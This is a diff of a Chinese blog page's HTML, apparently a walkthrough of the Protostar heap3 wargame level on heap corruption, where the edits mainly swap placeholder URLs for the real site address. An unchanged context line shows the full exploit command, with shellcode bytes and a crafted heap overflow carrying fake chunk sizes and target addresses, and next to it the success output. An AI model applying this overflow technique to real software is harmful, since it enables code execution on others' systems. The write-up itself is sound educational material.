@@ -8,7 +8,7 @@
   <meta name="description" content="1 源码1234567891011121314151617181920212223242526272829#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;string.h&amp;gt;#include &amp;lt;sys/types.h&amp;gt;#include &amp;lt;stdio.h&amp;gt;void winner()&amp;#123;">
 <meta property="og:type" content="article">
 <meta property="og:title" content="protostar详细解析 heap3-通过heap3理解堆腐坏的原理及利用方法">
-<meta property="og:url" content="http://yoursite.com/2015/12/14/protostar-heap3/index.html">
+<meta property="og:url" content="http://turingh.github.io/2015/12/14/protostar-heap3/index.html">
 <meta property="og:site_name" content="mrh的学习分享">
 <meta property="og:description" content="1 源码1234567891011121314151617181920212223242526272829#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;string.h&amp;gt;#include &amp;lt;sys/types.h&amp;gt;#include &amp;lt;stdio.h&amp;gt;void winner()&amp;#123;">
 <meta property="og:image" content="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/heap3_bins.png">
@@ -283,7 +283,7 @@
 <p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/heap3_exploit.png" alt="溢出后的free(c)"></p>
 <p>所以此题的答案也就出来了。</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user@protostar:/tmp$ ./bin/heap3 `python -c "print '\x90'*10 + '\x68\x64\x88\x04\x08\xc3'"` `python -c "print 'A'*32 + '\xfc\xff\xff\xff'*2 + 'CCCC' + '\x1c\xb1\x04\x08' + '\x04\xc0\x04\x08' "` F</span><br><span class="line">that wasn't too bad now, was it? @ 1449484612</span><br></pre></td></tr></table></figure>
-<p>具体的shellcode地址，<a href="http://BLOGIMAGE/2015/12/12/%E5%9B%BE%E8%A7%A3dwordshoot/" target="_blank" rel="external">DWORDSHOOT</a>如何构建，再之前的基础学习之后应该不需要想家复述，如有不明看<a href="http://turingh.github.io/2015/12/12/%E5%9B%BE%E8%A7%A3dwordshoot/" target="_blank" rel="external">这里</a>。</p>
+<p>具体的shellcode地址，<a href="http://BLOGIMAGE/2015/12/12/%E5%9B%BE%E8%A7%A3dwordshoot/" target="_blank" rel="external">DWORDSHOOT</a>如何构建，再之前的基础学习之后应该不需要想家复述，如有不明看<a href="http://turingh.github.io/2015/12/12/%E5%9B%BE%E8%A7%A3dwordshoot/">这里</a>。</p>
 
       
     </div>
@@ -297,8 +297,8 @@
         <p><span>发布时间:</span>2015年12月14日 - 15时57分</p>
         <p><span>最后更新:</span>2016年03月23日 - 23时38分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2015/12/14/protostar-heap3/" title="protostar详细解析 heap3-通过heap3理解堆腐坏的原理及利用方法">http://yoursite.com/2015/12/14/protostar-heap3/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2015/12/14/protostar-heap3/　　作者: mrh" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2015/12/14/protostar-heap3/" title="protostar详细解析 heap3-通过heap3理解堆腐坏的原理及利用方法">http://turingh.github.io/2015/12/14/protostar-heap3/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://turingh.github.io/2015/12/14/protostar-heap3/　　作者: mrh" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script src="/js/clipboard.min.js"></script>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
